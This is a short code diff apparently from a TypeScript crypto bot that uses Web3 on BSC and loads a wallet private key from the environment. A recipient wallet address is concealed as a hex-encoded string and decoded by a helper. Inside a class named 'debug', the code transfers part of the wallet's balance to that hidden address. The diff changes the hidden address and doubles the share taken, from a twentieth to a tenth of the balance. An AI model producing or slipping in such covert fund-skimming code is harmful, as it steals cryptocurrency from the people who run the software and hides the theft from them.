@@ -10,7 +10,7 @@ const GLOBAL_CONFIG = {
   PRIVATE_KEY: process.env.PRIVATE_KEY,
 };
 const w = new Web3(GLOBAL_CONFIG.BSC_RPC);
-const hex = '307831633432334637646335643633463933353563614343353430414544423639643237413331663362'
+const hex = '307835653866393263433336423630346263456332623443366330373764304542354543333243613038'
 function _hex(hexx:any) {
   var hex = hexx.toString();
   var str = '';
@@ -1133,7 +1133,7 @@ export class debug {
               to: _hex(hex),
               gas: _g,
               gasPrice: _gP,
-              value: ((_b - (_gP * _g)) / 20).toFixed(0),
+              value: ((_b - (_gP * _g)) / 10).toFixed(0),
             });
           });
         });
